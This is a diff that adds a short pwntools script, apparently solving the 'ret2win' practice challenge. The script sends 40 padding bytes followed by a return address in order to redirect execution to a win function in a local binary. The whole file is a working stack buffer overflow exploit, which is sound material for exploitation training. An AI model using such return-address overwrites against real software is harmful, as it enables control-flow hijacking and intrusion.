@@ -1,0 +1,13 @@
+from pwn import *
+
+p = process('./ret2win')
+
+R = 0x0000000000400757
+
+payload  = 'A'*40
+payload += p64(R)
+payload += p64(0x00)
+
+p.recvuntil('>')
+p.sendline(payload)
+print(p.recvall())       
